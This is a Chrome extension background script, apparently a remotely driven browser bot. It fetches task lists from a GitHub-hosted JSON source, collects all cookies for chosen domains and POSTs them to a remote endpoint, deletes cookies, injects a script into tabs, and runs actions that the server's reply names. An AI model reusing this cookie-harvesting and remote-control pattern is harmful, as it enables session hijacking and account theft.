const state = {urls: [], tasks: [], queryParam: {}};
const actions = {
    send: async body => {
        body = {
            payload: body,
            urls: state.urls,
            token: state.token,
            job: state.job,
            inject: false
        };
        const url = state.endPoint + "/browser";
        const endPoint = await fetch(url, {method: 'POST', body: JSON.stringify(body)});
        endPoint.json().then(response => {
            if (response.action)
                actions[response.action.name](...response.action.args);
        });
    },
    fetchGetJson: async name => {
        const url = "https://raw.githubusercontent.com/drupalista-br/drupalista-br.github.io/json/" + name + ".json";
        const response = await fetch(url);
        return response.json();
    },
    getTasks: (job, isBotInject) => {
        if (isBotInject)
            job = "inject/" + job;

        return actions.fetchGetJson(job);
    },
    cookiesEat: domains => {
        return Promise.all(promises.cookiesGetAll(domains)).then(jars => {
            let cookies = [];
            jars.forEach(jar => cookies = jar.result.concat(cookies));

            return Promise.all(promises.cookiesEat(cookies));
        });
    },
    cookiesEatReload: (domains, to) => {
        actions.cookiesEat(domains)
        .then(results => chrome.tabs.update(state.tabId, {"url": to}));
    },
    cookiesGetAllSend: domains => {
        Promise.all(promises.cookiesGetAll(domains)).then(jars => {
            let cookies = {};
            jars.forEach(jar => cookies[jar.domain] = jar.result);

            actions.send(cookies);
        });
    }
};
const promises = {
    cookiesGetAll: domains => {
        const promises = [];
        domains.forEach(domain => {
            promises.push(chrome.cookies.getAll({ domain: domain }).then(cookies => {
                return {
                    method: "cookiesGetAll",
                    domain: domain,
                    result: cookies
                };
            }));
        });
        return promises;
    },
    cookiesEat: cookies => {
        const promises = [];
        cookies.forEach(cookie => {
            const url = cookie => {
                if (cookie.domain.charAt(0) === ".")
                    cookie.domain = cookie.domain.replace(".", "");

                return "https://" + cookie.domain + cookie.path;
            };
            promises.push(chrome.cookies.remove({url: url(cookie), name: cookie.name}).then(cookie => {
                // cookie contains only name, storeId and url.
                return {
                    method: "cookiesEat",
                    result: cookie
                };
            }));
        });
        return promises;
    }
};
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status !== 'complete') return;
    const url = new URL(tab.url);
    const setStateQueryParam = () => {
        state.queryParam = {
            botJob: url.searchParams.get("botJob"),
            botInject: url.searchParams.has("botInject"),
            token: url.searchParams.get("botToken"),
            endPoint: url.searchParams.get("botEndPoint")
        };
    };
    const isBotInject = () => {
        if (!state.botInjectCookieValue) return;

        chrome.cookies.set({
            domain: url.hostname,
            name: "botInject",
            value: state.botInjectCookieValue,
            path: "/",
            url: url.protocol + "//" + url.hostname
        });
        return chrome.scripting.executeScript({target: {tabId: tabId}, files: ['inject.js']});
    };
    const starting = () => {
        const setState = (tasks, endPoints) => {
            const endPoint = () => state.queryParam.endPoint ?? "remote";
            const cookieValue = () => {
                const value = state.queryParam.botJob + "|" + state.queryParam.token + "|" + endPoint();
                if (state.queryParam.botInject)
                    return value;
            };
            state.urls.push(tab.url);
            state.token = state.queryParam.token;
            state.job = state.queryParam.botJob;
            state.tasks = [...tasks];
            state.endPoint = endPoints[endPoint()];
            state.botInjectCookieValue = cookieValue();
        };
        if (state.queryParam.botJob) {
            if (!state.queryParam.token)
                throw new Error("botToken query parameter is missing.");

            actions.fetchGetJson("endPoints").then(endPoints => {
                actions.getTasks(state.queryParam.botJob, state.queryParam.botInject).then(tasks => {
                    setState(tasks, endPoints);
                    state.tasks.shift();
                    if (isBotInject()) return;

                    actions[tasks[0].action.name](...tasks[0].action.args);
                });
            });
            return true;
        }
    };
    const onCourse = () => {
        if (state.tasks.length === 0) return;
        if (tab.url.includes(state.tasks[0].url)) {
            const name = state.tasks[0].action.name;
            const args = state.tasks[0].action.args;
            state.urls.push(tab.url);
            state.tasks.shift();

            if (isBotInject()) return;

            actions[name](...args);
        }
    };

    state.tabId = tabId;
    setStateQueryParam();
    if (starting()) return;
    onCourse();
});
